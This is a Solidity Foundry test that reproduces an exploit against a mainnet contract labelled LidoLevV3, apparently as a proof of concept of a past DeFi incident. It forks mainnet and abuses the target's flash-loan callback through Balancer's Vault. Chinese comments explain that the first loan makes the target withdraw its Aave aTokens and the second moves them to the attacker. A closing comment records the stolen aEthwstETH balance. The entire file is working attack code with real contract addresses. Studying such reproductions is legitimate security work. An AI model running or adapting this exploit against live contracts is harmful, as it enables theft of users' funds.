// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IBalancer.sol";
import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";

IERC20 constant aEthwstETH = IERC20(0x0B925eD163218f6662a35e0f0371Ac234f9E9371);
IBalancerVault constant Vault = IBalancerVault(
    0xBA12222222228d8Ba445958a75a0704d566BF2C8
);
address constant LidoLevV3 = 0xcd6ca2f0d0c182C5049D9A1F65cDe51A706ae142;
WETH9 constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

contract ExploitTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 19_132_935 - 1);
        vm.label(address(aEthwstETH), "aEthwstETH");
        vm.label(address(Vault), "Vault");
        vm.label(address(LidoLevV3), "LidoLevV3");
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() external {
        print(
            "aEthwstETH balance before",
            IERC20(aEthwstETH).balanceOf(address(this)),
            18
        );

        bytes memory userencodeData1 = abi.encode(1, address(this));
        bytes memory userencodeData2 = abi.encode(2, address(this));
        uint256[] memory amount = new uint256[](1);
        uint256[] memory amount2 = new uint256[](1);
        address[] memory token = new address[](1);

        token[0] = address(WETH);
        amount[0] = 318973831042619036856;
        amount2[0] = 0;
        // 这一步是把将攻击目标向aave提取Atoken
        Vault.flashLoan(LidoLevV3, token, amount, userencodeData1);
        // 这一步将上一步的Atoken转移过来
        Vault.flashLoan(LidoLevV3, token, amount2, userencodeData2);

        print(
            "aEthwstETH balance after",
            IERC20(aEthwstETH).balanceOf(address(this)),
            18
        );
        // aEthwstETH balance after: 33.698806193381635860
    }
}
